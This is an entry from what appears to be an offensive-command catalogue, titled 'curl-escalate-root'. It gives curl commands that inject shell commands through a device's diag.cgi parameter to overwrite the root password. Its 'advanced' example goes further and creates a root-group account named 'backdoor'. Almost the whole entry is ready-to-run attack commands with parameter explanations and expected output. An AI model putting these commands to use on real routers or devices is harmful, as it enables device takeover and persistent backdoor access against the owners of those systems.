---
id: g7h8i9j0-k1l2-3456-ghij-789012345678
data: >-
  curl -b cookies.txt -X POST http://<device-ip>/diag.cgi -d "param1=test;echo
  'newroot:newpass' | chpasswd;" -v
tags:
  - escalation
type: command
output: Password updated successfully
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:29:44.504Z'
verified: false
validated: true
submitted: true
---
# curl-escalate-root

## Command

```bash
curl -b cookies.txt -X POST http://<device-ip>/diag.cgi -d "param1=test;echo 'newroot:newpass' | chpasswd;" -v
```

## Description

Escalates privileges by injecting a command to update or create a root-level user password, enabling subsequent full access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-b cookies.txt` | Session cookies | Yes |
| `-X POST` | HTTP method | Yes |
| `http://<device-ip>/diag.cgi` | Endpoint | Yes |
| `-d "param1=..."` | Payload with chpasswd | Yes |
| `-v` | Verbose | No |

## Examples

### Basic Usage

```bash
curl -b cookies.txt -X POST http://192.168.1.1/diag.cgi -d "cmd=;echo 'root:backdoor' | chpasswd;"
```

### Advanced Usage

```bash
curl -b cookies.txt -X POST http://192.168.1.1/diag.cgi -d "param1=test;useradd -m backdoor -G root; echo 'backdoor:pass' | chpasswd;"
```

## Expected Output

No error in response, with ability to login as new root user confirming success.

## Related

- [[Related Procedure]]
